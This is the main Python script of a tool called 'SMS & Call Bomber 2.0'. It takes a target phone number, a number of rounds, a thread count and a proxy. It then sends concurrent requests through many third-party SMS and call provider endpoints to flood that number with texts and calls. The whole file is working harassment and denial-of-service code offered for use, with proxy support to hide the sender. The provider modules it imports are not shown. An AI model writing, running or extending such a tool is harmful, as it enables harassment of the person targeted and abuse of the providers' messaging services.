#!/usr/bin/env python3

import asyncio
import signal
from typing import NoReturn
import argparse
import sys
import os

# Add the parent directory to sys.path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Change relative imports to absolute
from sms_bomber.core.config import AppConfig
from sms_bomber.core.logger import setup_logger
from sms_bomber.api.providers import ProviderRegistry
from sms_bomber.api.call_providers import CallProviderRegistry
from sms_bomber.api.client import APIClient
from sms_bomber.api.call_client import CallBomberClient
from sms_bomber.ui.console import ConsoleUI
from sms_bomber.ui.progress import ProgressTracker


def parse_args() -> AppConfig:
    """Parse command line arguments and create configuration."""
    parser = argparse.ArgumentParser(description="SMS & Call Bomber 2.0")
    parser.add_argument("target", help="Target phone number")
    parser.add_argument(
        "-c", "--count", type=int, default=1, help="Number of bombing rounds"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=5, help="Number of concurrent threads"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose output"
    )
    parser.add_argument("-x", "--proxy", help="Proxy server (http/https)")
    parser.add_argument("--sms-only", action="store_true", help="SMS bombing only")
    parser.add_argument("--calls-only", action="store_true", help="Call bombing only")

    args = parser.parse_args()
    config = AppConfig(
        target=args.target,
        count=args.count,
        threads=args.threads,
        verbose=args.verbose,
        proxy=args.proxy,
        sms_only=getattr(args, 'sms_only', False),
        calls_only=getattr(args, 'calls_only', False),
    )
    config.validate()
    return config


async def bomber(config: AppConfig) -> NoReturn:
    """Main bombing coroutine."""
    ui = ConsoleUI()
    ui.display_banner()
    ui.display_config(config)

    # Initialize registries and clients
    sms_registry = ProviderRegistry()
    call_registry = CallProviderRegistry()
    sms_client = APIClient(timeout=config.timeout, proxy=config.proxy_dict)
    call_client = CallBomberClient(timeout=config.timeout, proxy=config.proxy_dict)

    # Get providers based on mode
    sms_providers = [] if config.calls_only else sms_registry.get_all_providers()
    call_providers = [] if config.sms_only else call_registry.get_all_providers()
    
    total_providers = len(sms_providers) + len(call_providers)
    
    if total_providers == 0:
        ui.console.print("[red]No providers selected![/red]")
        return
    
    # Optional: Quick health check
    if config.verbose:
        ui.console.print(f"[yellow]SMS Providers: {len(sms_providers)}[/yellow]")
        ui.console.print(f"[yellow]Call Providers: {len(call_providers)}[/yellow]")
        ui.console.print("[cyan]Use 'python update_providers.py' to test provider health[/cyan]")
    
    total_requests = total_providers * config.count
    tracker = ProgressTracker(total_requests)

    with ui.create_progress() as progress:
        task = progress.add_task("Bombing...", total=total_requests)

        async def process_sms_provider(provider):
            data = provider.get_request_data(config.target)
            url = provider.get_formatted_url(config.target)
            content_type = getattr(provider, 'content_type', 'json')
            method = getattr(provider, 'method', 'POST')
            result = await sms_client.send_request(provider.name, url, data, content_type, method)
            result["type"] = "sms"
            tracker.update(result)
            progress.update(task, advance=1)
            if config.verbose:
                status = "✓" if result["success"] else "✗"
                ui.console.print(f"[cyan][SMS][/cyan] {provider.name}: {status}")
            return result

        async def process_call_provider(provider):
            data = provider.get_request_data(config.target)
            url = provider.get_formatted_url(config.target)
            result = await call_client.send_call_request(provider.name, url, data)
            tracker.update(result)
            progress.update(task, advance=1)
            if config.verbose:
                status = "✓" if result["success"] else "✗"
                ui.console.print(f"[green][CALL][/green] {provider.name}: {status}")
            return result

        tasks = []
        semaphore = asyncio.Semaphore(config.threads)

        async def bounded_process_sms(provider):
            async with semaphore:
                return await process_sms_provider(provider)

        async def bounded_process_call(provider):
            async with semaphore:
                return await process_call_provider(provider)

        for _ in range(config.count):
            # Add SMS tasks
            for provider in sms_providers:
                tasks.append(asyncio.create_task(bounded_process_sms(provider)))
            
            # Add call tasks
            for provider in call_providers:
                tasks.append(asyncio.create_task(bounded_process_call(provider)))

        results = await asyncio.gather(*tasks)

    ui.console.print(tracker.get_stats_table())


def main() -> None:
    """Application entry point."""
    try:
        config = parse_args()
        logger = setup_logger(config.log_dir)

        def signal_handler(sig, frame):
            logger.warning("Interrupted by user")
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)

        asyncio.run(bomber(config))
    except Exception as e:
        logger.error(f"Application error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
